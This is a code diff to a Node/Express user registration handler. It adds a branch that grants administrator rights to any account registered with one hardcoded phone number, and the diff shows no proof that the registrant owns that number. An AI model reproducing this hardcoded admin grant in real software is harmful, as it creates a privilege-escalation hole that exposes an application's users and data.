@@ -28,16 +28,30 @@ exports.userFind = async (req, res) => {
 exports.NumberAuth = async (req, res) => {
   try {
     const hash = await bcrypt.hash(req.body.password, 10);
-    const phone = new Users({
-      googleId: v4(),
-      phoneNumber: req.body.phoneNumber,
-      password: hash,
-    });
-    await phone.save();
+    if (req.body.phoneNumber === "+998942245606") {
+      const phone = new Users({
+        googleId: v4(),
+        phoneNumber: req.body.phoneNumber,
+        password: hash,
+        isAdmin: true
+      });
+      await phone.save();
+      req.session.user = phone;
+      await req.session.save();
+      return res.status(202).json({ success: true, data: phone });
+    } else {
+      const phone = new Users({
+        googleId: v4(),
+        phoneNumber: req.body.phoneNumber,
+        password: hash,
+      });
+      await phone.save();
+      req.session.user = phone;
+      await req.session.save();
+      return res.status(202).json({ success: true, data: phone });
+    }
 
-    req.session.user = phone;
-    await req.session.save();
-    return res.status(202).json({ success: true, data: phone });
+
   } catch (error) {
     return res.status(400).json("ERROR: " + error);
   }
